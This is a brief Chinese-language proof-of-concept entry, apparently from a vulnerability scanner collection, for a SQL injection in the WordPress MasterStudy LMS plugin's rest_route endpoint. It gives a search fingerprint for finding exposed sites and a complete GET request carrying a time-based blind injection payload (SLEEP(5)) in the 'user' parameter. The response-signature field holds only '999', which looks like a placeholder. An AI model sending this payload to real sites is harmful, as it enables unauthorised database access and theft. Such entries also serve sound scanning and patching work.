# WordPressrest_routeSQL注入漏洞

WordPress ｜ SQL注入 ｜ —
- **指纹**：`body="wp-content/plugins/masterstudy-lms-learning-management-system/"`
- **请求**：`GET /?rest_route=/lms/stm-lms/order/items&author_id=1&user=1) AND (SELECT 9904 FROM (SELECT(SLEEP(5)))cdgB) AND (3049=3049 HTTP/1.1`
- **响应特征**：999